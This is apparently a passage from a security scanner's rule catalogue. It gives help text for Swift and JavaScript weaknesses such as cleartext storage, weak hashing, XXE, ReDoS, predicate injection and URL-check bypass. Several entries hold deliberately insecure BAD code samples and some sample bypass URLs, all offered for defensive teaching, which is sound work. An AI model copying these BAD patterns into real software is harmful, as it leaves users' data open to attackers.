    "help": "# String length conflation\nUsing a length value from an `NSString` in a `String`, or a count from a `String` in an `NSString`, may cause unexpected behavior including (in some cases) buffer overwrites. This is because certain unicode sequences are represented as one character in a `String` but as a sequence of multiple characters in an `NSString`. For example, a 'thumbs up' emoji with a skin tone modifier (\ud83d\udc4d\ud83c\udfff) is represented as U+1F44D (\ud83d\udc4d) then the modifier U+1F3FF.\n\nThis issue can also arise from using the values of `String.utf8.count`, `String.utf16.count` or `String.unicodeScalars.count` in an unsuitable place.\n\n\n## Recommendation\nUse `String.count` when working with a `String`. Use `NSString.length` when working with an `NSString`. Do not mix values for lengths and offsets between the two types as they are not compatible measures.\n\nIf you need to convert between `Range` and `NSRange`, do so directly using the appropriate initializer. Do not attempt to use incompatible length and offset values to accomplish conversion.\n\n\n## Example\nIn the following example, a `String` is converted to `NSString`, but a range is created from the `String` to do some processing on it.\n\n\n```swift\n\nfunc myFunction(s: String) {\n\tlet ns = NSString(string: s)\n\tlet nsrange = NSMakeRange(0, s.count) // BAD: String length used in NSMakeRange\n\n\t// ... use nsrange to process ns\n}\n\n```\nThis is dangerous because, if the input contains certain characters, the range computed on the `String` will be wrong for the `NSString`. This will lead to incorrect behaviour in the string processing that follows. To fix the problem, we can use `NSString.length` to create the `NSRange` instead, as follows:\n\n\n```swift\n\nfunc myFunction(s: String) {\n\tlet ns = NSString(string: s)\n\tlet nsrange = NSMakeRange(0, ns.length) // Fixed: NSString length used in NSMakeRange\n\n\t// ... use nsrange to process ns\n}\n\n```\n\n## References\n* [Swift String vs. NSString](https://talk.objc.io/episodes/S01E80-swift-string-vs-nsstring)\n* Common Weakness Enumeration: [CWE-135](https://cwe.mitre.org/data/definitions/135.html).\n"
  },
  "swift/cleartext-transmission": {
    "name": "Cleartext transmission of sensitive information",
    "description": "Transmitting sensitive information across a network in cleartext can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/cleartext-transmission",
    "tags": [
      "security",
      "external/cwe/cwe-319"
    ],
    "filename": "1c86cbdc-CleartextTransmission",
    "language": "swift",
    "help": "# Cleartext transmission of sensitive information\nSensitive information that is transmitted without encryption may be accessible to an attacker.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being transmitted over the network. In general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext. Avoid transmitting sensitive information when it is not necessary to.\n\n\n## Example\nThe following example shows three cases of transmitting information. In the 'BAD' case, the data transmitted is sensitive (a credit card number) and is not encrypted. In the 'GOOD' cases, the data is either not sensitive, or is protected with encryption. When encryption is used, take care to select a secure modern encryption algorithm, and put suitable key management practices into place.\n\n\n```swift\nimport CryptoKit\n\nprivate func encrypt(_ text: String, _ encryptionKey: SymmetricKey) -> String {\n\tlet sealedBox = try! AES.GCM.seal(Data(text.utf8), using: encryptionKey)\n\treturn sealedBox.combined!.base64EncodedString()\n}\n\nfunc transmitMyData(connection : NWConnection, faveSong : String, creditCardNo : String, encryptionKey: SymmetricKey) {\n\t// ...\n\n\t// GOOD: not sensitive information\n\tconnection.send(content: faveSong, completion: .idempotent)\n\n\t// BAD: sensitive information saved in cleartext\n\tconnection.send(content: creditCardNo, completion: .idempotent)\n\n\t// GOOD: encrypted sensitive information saved\n\tconnection.send(content: encrypt(creditCardNo, encryptionKey), completion: .idempotent)\n\n\t// ...\n}\n\n```\n\n## References\n* OWASP Top 10:2021: [A02:2021 \ufffd Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/).\n* OWASP: [Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n"
  },
  "swift/weak-sensitive-data-hashing": {
    "name": "Use of a broken or weak cryptographic hashing algorithm on sensitive data",
    "description": "Using broken or weak cryptographic hashing algorithms can compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/weak-sensitive-data-hashing",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328"
    ],
    "filename": "8849d37c-WeakSensitiveDataHashing",
    "language": "swift",
    "help": "# Use of a broken or weak cryptographic hashing algorithm on sensitive data\nUsing a broken or weak cryptographic hash function can leave data vulnerable, and should not be used in security related code.\n\nA strong cryptographic hash function should be resistant to:\n\n* **Pre-image attacks**. If you know a hash value `h(x)`, you should not be able to easily find the input `x`.\n* **Collision attacks**. If you know a hash value `h(x)`, you should not be able to easily find a different input `y` with the same hash value `h(x) = h(y)`.\nAs an example, both MD5 and SHA-1 are known to be vulnerable to collision attacks.\n\nSince it's OK to use a weak cryptographic hash function in a non-security context, this query only alerts when these are used to hash sensitive data (such as passwords, certificates, usernames).\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic hash function, such as:\n\n* Argon2, scrypt, bcrypt, or PBKDF2 for passwords and other data with limited input space where a dictionary-like attack is feasible.\n* SHA-2, or SHA-3 in other cases.\nNote that special purpose algorithms, which are used to ensure that a message comes from a particular sender, exist for message authentication. These algorithms should be used when appropriate, as they address common vulnerabilities of simple hashing schemes in this context.\n\n\n## Example\nThe following examples show a function for fetching data from a URL along with a hash of the data, perhaps to check the data has not been tampered with.\n\nIn the first case the MD5 hashing algorithm is used that is known to be vulnerable to collision attacks.\n\n\n```swift\nfunc getContentsAndHash(url: URL) -> (Data, String)? {\n    guard let data = try? Data(contentsOf: url) else {\n        return nil\n    }\n\n    let digest = Insecure.MD5.hash(data: data) // BAD: MD5 is not suitable for hashing sensitive data.\n    let hash = digest.map { String(format: \"%02hhx\", $0) }.joined()\n\n    return (data, hash)\n}\n\n```\nHere is the same function using SHA-512, which is a strong cryptographic hashing function.\n\n\n```swift\nfunc getContentsAndHash(url: URL) -> (Data, String)? {\n    guard let data = try? Data(contentsOf: url) else {\n        return nil\n    }\n\n    let digest = SHA512.hash(data: data) // GOOD: SHA-512 is suitable for hashing sensitive data.\n    let hash = digest.map { String(format: \"%02hhx\", $0) }.joined()\n\n    return (data, hash)\n}\n\n```\n\n## References\n* OWASP: [Password Storage Cheat Sheet ](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) and [ Transport Layer Protection Cheat Sheet ](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-strong-cryptographic-hashing-algorithms)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n"
  },
  "swift/insufficient-hash-iterations": {
    "name": "Insufficient hash iterations",
    "description": "Using hash functions with fewer than 120,000 iterations is insufficient to protect passwords because a cracking attack will require a low level of computational effort.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "swift/insufficient-hash-iterations",
    "tags": [
      "security",
      "external/cwe/cwe-916"
    ],
    "filename": "fd72a1f2-InsufficientHashIterations",
    "language": "swift",
    "help": "# Insufficient hash iterations\nStoring cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.\n\nA good password hashing scheme requires a computation that cannot be done efficiently. Hashing schemes with low number of iterations are efficiently computable, and are therefore not suitable for password hashing.\n\n\n## Recommendation\nUse the OWASP recommendation for sufficient number of iterations (currently, that is greater than or equal to 120,000) for password hashing schemes.\n\n\n## Example\nThe following example shows a few cases where a password hashing scheme is instantiated. In the 'BAD' cases, the scheme is initialized with insufficient iterations, making it susceptible to password cracking attacks. In the 'GOOD' cases, the scheme is initialized with at least 120,000 iterations, which protects the hashed data against recovery.\n\n\n```swift\n\nfunc hash() {\n\t// ...\n\n\t// BAD: Using insufficient (that is, < 120,000) iterations for password hashing\n\t_ = try PKCS5.PBKDF1(password: getRandomArray(), salt: getRandomArray(), iterations: 90000, keyLength: 0)\n\t_ = try PKCS5.PBKDF2(password: getRandomArray(), salt: getRandomArray(), iterations: 90000, keyLength: 0)\n\n\t// GOOD: Using sufficient (that is, >= 120,000) iterations for password hashing\n\t_ = try PKCS5.PBKDF1(password: getRandomArray(), salt: getRandomArray(), iterations: 120120, keyLength: 0)\n\t_ = try PKCS5.PBKDF2(password: getRandomArray(), salt: getRandomArray(), iterations: 310000, keyLength: 0)\n\n\t// ...\n}\n\n```\n\n## References\n* Password-Based Cryptography Specification Version 2.0. 2000.[RFC2898](https://www.rfc-editor.org/rfc/rfc2898).\n* OWASP [Password Storage Cheat Sheet.](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n"
  },
  "swift/constant-password": {
    "name": "Constant password",
    "description": "Using constant passwords is not secure, because potential attackers can easily recover them from the source code.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.8,
    "precision": "high",
    "id": "swift/constant-password",
    "tags": [
      "security",
      "external/cwe/cwe-259"
    ],
    "filename": "8df59135-ConstantPassword",
    "language": "swift",
    "help": "# Constant password\nDeriving password-based encryption keys using hardcoded passwords is insecure, because the generated key may be easily discovered. Data hashed using constant salts is vulnerable to dictionary attacks, enabling attackers to recover the original input.\n\nIn particular, constant passwords would enable easier recovery of the key, even in the presence of a salt. If that salt is random enough, then key recovery is not as easy as just looking up a hardcoded credential in the source code.\n\n\n## Recommendation\nUse randomly generated passwords to securely derive a password-based encryption key.\n\n\n## Example\nThe following example shows a few cases of hashing input data. In the 'BAD' cases, the password is constant, making the derived key vulnerable to dictionary attakcs. In the 'GOOD' cases, the password is randomly generated, which protects the hashed data against recovery.\n\n\n```swift\n\nfunc encrypt(padding : Padding) {\n\t// ...\n\n\t// BAD: Using constant passwords for hashing\n\tlet password: Array<UInt8> = [0x2a, 0x3a, 0x80, 0x05]\n\tlet randomArray = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\t_ = try HKDF(password: password, salt: randomArray, info: randomArray, keyLength: 0, variant: Variant.sha2)\n\t_ = try PKCS5.PBKDF1(password: password, salt: randomArray, iterations: 120120, keyLength: 0)\n\t_ = try PKCS5.PBKDF2(password: password, salt: randomArray, iterations: 120120, keyLength: 0)\n\t_ = try Scrypt(password: password, salt: randomArray, dkLen: 64, N: 16384, r: 8, p: 1)\n\n\t// GOOD: Using randomly generated passwords for hashing\n\tlet password = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\tlet randomArray = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\t_ = try HKDF(password: password, salt: randomArray, info: randomArray, keyLength: 0, variant: Variant.sha2)\n\t_ = try PKCS5.PBKDF1(password: password, salt: randomArray, iterations: 120120, keyLength: 0)\n\t_ = try PKCS5.PBKDF2(password: password, salt: randomArray, iterations: 120120, keyLength: 0)\n\t_ = try Scrypt(password: password, salt: randomArray, dkLen: 64, N: 16384, r: 8, p: 1)\n\n\t// ...\n}\n\n```\n\n## References\n* Okta blog: [What are Salted Passwords and Password Hashing?](https://www.okta.com/blog/2019/03/what-are-salted-passwords-and-password-hashing/)\n* RFC 2898: [Password-Based Cryptography Specification](https://www.rfc-editor.org/rfc/rfc2898).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n"
  },
  "swift/predicate-injection": {
    "name": "Predicate built from user-controlled sources",
    "description": "Building an NSPredicate from user-controlled sources may lead to attackers changing the predicate's intended logic.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "swift/predicate-injection",
    "tags": [
      "security",
      "external/cwe/cwe-943"
    ],
    "filename": "8bf96781-PredicateInjection",
    "language": "swift",
    "help": "# Predicate built from user-controlled sources\nPredicates represent logical conditions that can be used to check whether an object matches them. If a predicate is built from user-provided data without sufficient sanitization, an attacker may be able to change the overall meaning of the predicate.\n\n\n## Recommendation\nWhen building a predicate from untrusted data, you should either pass it to the appropriate `arguments` parameter during initialization, or as an array of substitution variables before evaluation. You should not append or concatenate it to the body of the predicate.\n\n\n## Example\nIn the following insecure example, `NSPredicate` is built directly from data obtained from an HTTP request. This is untrusted, and can be arbitrarily set by an attacker to alter the meaning of the predicate:\n\n\n```swift\nlet remoteString = try String(contentsOf: URL(string: \"https://example.com/\")!)\n\nlet filenames: [String] = [\"img1.png\", \"img2.png\", \"img3.png\", \"img.txt\", \"img.csv\"]\n\nlet predicate = NSPredicate(format: \"SELF LIKE \\(remoteString)\")\nlet filtered = filenames.filter(){ filename in\n    predicate.evaluate(with: filename)\n}\nprint(filtered)\n\n```\nA better way to do this is to use the `arguments` parameter of `NSPredicate`'s initializer. This prevents attackers from altering the meaning of the predicate, even if they control the externally obtained data, as seen in the following secure example:\n\n\n```swift\nlet remoteString = try String(contentsOf: URL(string: \"https://example.com/\")!)\n\nlet filenames: [String] = [\"img1.png\", \"img2.png\", \"img3.png\", \"img.txt\", \"img.csv\"]\n\nlet predicate = NSPredicate(format: \"SELF LIKE %@\", remoteString)\nlet filtered = filenames.filter(){ filename in\n    predicate.evaluate(with: filename)\n}\nprint(filtered)\n\n```\n\n## References\n* Apple Developer Documentation: [NSPredicate](https://developer.apple.com/documentation/foundation/nspredicate)\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n"
  },
  "swift/unsafe-webview-fetch": {
    "name": "Unsafe WebView fetch",
    "description": "Fetching data in a WebView without restricting the base URL may allow an attacker to access sensitive local data, or enable cross-site scripting attack.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "swift/unsafe-webview-fetch",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-095",
      "external/cwe/cwe-749"
    ],
    "filename": "f64376b1-UnsafeWebViewFetch",
    "language": "swift",
    "help": "# Unsafe WebView fetch\nFetching data in a web view without restricting the base URL may allow an attacker to access sensitive local data, for example using `file://`. Data can then be extracted from the software using the URL of a machine under the attacker's control. More generally, an attacker may use a URL under their control as part of a cross-site scripting attack.\n\n\n## Recommendation\nWhen loading HTML into a web view, always set the `baseURL` to an appropriate URL that you control, or to `about:blank`. Do not use `nil`, as this does not restrict URLs that can be resolved. Also do not use a `baseURL` that could itself be controlled by an attacker.\n\n\n## Example\nIn the following example, a call to `UIWebView.loadHTMLString` has the `baseURL` set to `nil`, which does not restrict URLs that can be resolved from within the web page.\n\n\n```swift\n\nlet webview = UIWebView()\n\n...\n\nwebview.loadHTMLString(htmlData, baseURL: nil) // BAD\n\n```\nTo fix the problem, we set the `baseURL` to `about:blank`. This ensures that an attacker cannot resolve URLs that point to the local file system, or to web servers under their control.\n\n\n```swift\n\nlet webview = UIWebView()\n\n...\n\nwebview.loadHTMLString(htmlData, baseURL: URL(string: \"about:blank\")) // GOOD\n\n```\n\n## References\n* [iOS Bug Hunting - Web View XSS](https://www.allysonomalley.com/2018/12/03/ios-bug-hunting-web-view-xss/).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-749](https://cwe.mitre.org/data/definitions/749.html).\n"
  },
  "swift/xxe": {
    "name": "Resolving XML external entity in user-controlled data",
    "description": "Parsing user-controlled XML documents and allowing expansion of external entity references may lead to disclosure of confidential data or denial of service.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "swift/xxe",
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-776",
      "external/cwe/cwe-827"
    ],
    "filename": "7da5dc17-XXE",
    "language": "swift",
    "help": "# Resolving XML external entity in user-controlled data\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, out-of-band data retrieval techniques may allow attackers to steal sensitive data. Denial of services can also be carried out in this situation.\n\n\n## Recommendation\nThe easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `XMLParser`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.\n\n\n## Example\nThe following example uses the `XMLParser` class to parse a string `data`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is also setting its `shouldResolveExternalEntities` option to `true`:\n\n\n```swift\nlet parser = XMLParser(data: remoteData) // BAD (parser explicitly enables external entities)\nparser.shouldResolveExternalEntities = true\n\n```\nTo guard against XXE attacks, the `shouldResolveExternalEntities` option should be left unset or explicitly set to `false`.\n\n\n```swift\nlet parser = XMLParser(data: remoteData) // GOOD (parser explicitly disables external entities)\nparser.shouldResolveExternalEntities = false\n\n```\n\n## References\n* OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* OWASP: [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).\n* Timothy D. Morgan and Omar Al Ibrahim [XML Schema, DTD, and Entity Attacks: A Compendium of Known Techniques](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).\n* Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n* Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).\n* Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).\n"
  },
  "swift/regex-injection": {
    "name": "Regular expression injection",
    "description": "User input should not be used in regular expressions without first being escaped, otherwise a malicious user may be able to provide a regex that could require exponential time on certain inputs.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/regex-injection",
    "tags": [
      "security",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "c01c1575-RegexInjection",
    "language": "swift",
    "help": "# Regular expression injection\nConstructing a regular expression with unsanitized user input is dangerous, since a malicious user may be able to modify the meaning of the expression. They may be able to cause unexpected program behaviour, or perform a denial-of-service attack. For example, they may provide a regular expression fragment that takes exponential time to evaluate in the worst case.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as `NSRegularExpression::escapedPattern(for:)` to escape meta-characters that have special meaning.\n\n\n## Example\nThe following examples construct regular expressions from user input without sanitizing it first:\n\n\n```swift\nfunc processRemoteInput(remoteInput: String) {\n  ...\n\n  // BAD: Unsanitized user input is used to construct a regular expression\n  let regex1 = try Regex(remoteInput)\n\n  // BAD: Unsanitized user input is used to construct a regular expression\n  let regexStr = \"abc|\\(remoteInput)\"\n  let regex2 = try NSRegularExpression(pattern: regexStr)\n\n  ...\n}\n\n```\nIf user input is used to construct a regular expression it should be sanitized first. This ensures that the user cannot insert characters that have special meanings in regular expressions.\n\n\n```swift\nfunc processRemoteInput(remoteInput: String) {\n  ...\n\n  // GOOD: Regular expression is not derived from user input\n  let regex1 = try Regex(myRegex)\n\n  // GOOD: User input is sanitized before being used to construct a regular expression\n  let escapedInput = NSRegularExpression.escapedPattern(for: remoteInput)\n  let regexStr = \"abc|\\(escapedInput)\"\n  let regex2 = try NSRegularExpression(pattern: regexStr)\n\n  ...\n}\n\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Swift: [NSRegularExpression.escapedPattern(for:)](https://developer.apple.com/documentation/foundation/nsregularexpression/1408386-escapedpattern).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "swift/cleartext-storage-preferences": {
    "name": "Cleartext storage of sensitive information in an application preference store",
    "description": "Storing sensitive information in a non-encrypted store can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/cleartext-storage-preferences",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "filename": "490a3077-CleartextStoragePreferences",
    "language": "swift",
    "help": "# Cleartext storage of sensitive information in an application preference store\nSensitive information that is stored unencrypted in an application preference store, such as the user defaults database or the iCloud-backed ubiquitous key-value store, is accessible to an attacker who gains access to that data store. For example, the information could be accessed by any process or user in a rooted device, by compromised app extensions, or could be exposed through another vulnerability.\n\n\n## Recommendation\nEither store the data in an encrypted database, or ensure that each piece of sensitive information is encrypted before being stored. In general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext. Avoid storing sensitive information at all if you do not need to keep it.\n\n\n## Example\nThe following example shows three cases of storing information using UserDefaults. In the 'BAD' case, the data that is stored is sensitive (a credit card number) and is not encrypted. In the 'GOOD' cases, the data is either not sensitive, or is protected with encryption. When encryption is used, take care to select a secure modern encryption algorithm, and put suitable key management practices into place.\n\n\n```swift\nimport CryptoKit\n\nprivate func encrypt(_ text: String, _ encryptionKey: SymmetricKey) -> String {\n\tlet sealedBox = try! AES.GCM.seal(Data(text.utf8), using: encryptionKey)\n\treturn sealedBox.combined!.base64EncodedString()\n}\n\nfunc storeMyData(faveSong : String, creditCardNo : String, encryptionKey: SymmetricKey) {\n\t// ...\n\n\t// GOOD: not sensitive information\n\tUserDefaults.standard.set(faveSong, forKey: \"myFaveSong\")\n\n\t// BAD: sensitive information saved in cleartext\n\tUserDefaults.standard.set(creditCardNo, forKey: \"myCreditCardNo\")\n\n\t// GOOD: encrypted sensitive information saved\n\tUserDefaults.standard.set(encrypt(creditCardNo, encryptionKey), forKey: \"myCreditCardNo\")\n\n\t// ...\n}\n\n```\n\n## References\n* OWASP Top 10:2021: [A02:2021 &mdash; Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/).\n* Apple Developer Documentation: [UserDefaults](https://developer.apple.com/documentation/foundation/userdefaults), [NSUbiquitousKeyValueStore](https://developer.apple.com/documentation/foundation/nsubiquitouskeyvaluestore)\n* OWASP: [Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "swift/cleartext-storage-database": {
    "name": "Cleartext storage of sensitive information in a local database",
    "description": "Storing sensitive information in a non-encrypted database can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/cleartext-storage-database",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "filename": "1c86cbdc-CleartextStorageDatabase",
    "language": "swift",
    "help": "# Cleartext storage of sensitive information in a local database\nSensitive information that is stored unencrypted in a database is accessible to an attacker who gains access to that database. For example, the information could be accessed by any process or user in a rooted device, or exposed through another vulnerability.\n\n\n## Recommendation\nEither encrypt the entire database, or ensure that each piece of sensitive information is encrypted before being stored. In general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext. Avoid storing sensitive information at all if you do not need to keep it.\n\n\n## Example\nThe following example shows three cases of storing information using the Core Data library. In the 'BAD' case, the data that is stored is sensitive (a credit card number) and is not encrypted. In the 'GOOD' cases, the data is either not sensitive, or is protected with encryption. When encryption is used, take care to select a secure modern encryption algorithm, and put suitable key management practices into place.\n\n\n```swift\nimport CryptoKit\n\nprivate func encrypt(_ text: String, _ encryptionKey: SymmetricKey) -> String {\n\tlet sealedBox = try! AES.GCM.seal(Data(text.utf8), using: encryptionKey)\n\treturn sealedBox.combined!.base64EncodedString()\n}\n\nfunc storeMyData(databaseObject : NSManagedObject, faveSong : String, creditCardNo : String, encryptionKey: SymmetricKey) {\n\t// ...\n\n\t// GOOD: not sensitive information\n\tdatabaseObject.setValue(faveSong, forKey: \"myFaveSong\")\n\n\t// BAD: sensitive information saved in cleartext\n\tdatabaseObject.setValue(creditCardNo, forKey: \"myCreditCardNo\")\n\n\t// GOOD: encrypted sensitive information saved\n\tdatabaseObject.setValue(encrypt(creditCardNo, encryptionKey), forKey: \"myCreditCardNo\")\n\n\t// ...\n}\n\n```\n\n## References\n* OWASP Top 10:2021: [A02:2021 \ufffd Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/).\n* OWASP: [Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "swift/redos": {
    "name": "Inefficient regular expression",
    "description": "A regular expression that requires exponential time to match certain inputs can be a performance bottleneck, and may be vulnerable to denial-of-service attacks.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "b5549a63-ReDoS",
    "language": "swift",
    "help": "# Inefficient regular expression\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, and potentially allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine used by Swift uses backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time complexity does not matter.\n\n\n## Example\nConsider the following regular expression:\n\n```\n\n/^_(__|.)+_$/\n```\nIts sub-expression `\"(__|.)+\"` can match the string `\"__\"` either by the first alternative `\"__\"` to the left of the `\"|\"` operator, or by two repetitions of the second alternative `\".\"` to the right. Therefore, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.\n\nThis problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:\n\n```\n\n/^_(__|[^_])+_$/\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/incomplete-url-substring-sanitization": {
    "name": "Incomplete URL substring sanitization",
    "description": "Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/incomplete-url-substring-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "bc247e13-IncompleteUrlSubstringSanitization",
    "language": "javascript",
    "help": "# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        